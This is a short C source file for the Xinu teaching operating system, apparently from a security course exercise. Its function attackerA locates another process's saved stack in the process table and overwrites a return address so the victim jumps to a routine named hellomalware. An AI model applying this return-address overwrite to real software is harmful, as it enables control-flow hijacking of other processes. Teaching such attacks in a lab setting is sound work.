/* attackerA.c - attackerA */

#include <xinu.h>

/*--------------------------------------------------------
 * attackerA - attacks a process and kills it
 *--------------------------------------------------------
 */
void attackerA(
    int y /* The number of pids to decrement from currpid */
    )
{
  pid32 victimpid;
  struct procent *prptr;
  long *saddr;

  /* Obtain the victim ID */
  victimpid  = getpid() - y;

  if (isbadpid(victimpid)) {
    return;
  }

  /* Get the victims stkptr */
  prptr = &proctab[victimpid];
  saddr = (long *) (prptr->prstkptr);

  /* Overwrite the return address */
  saddr = saddr + 2;
  saddr = ((long *) *saddr);
  *++saddr = (long) hellomalware;
}

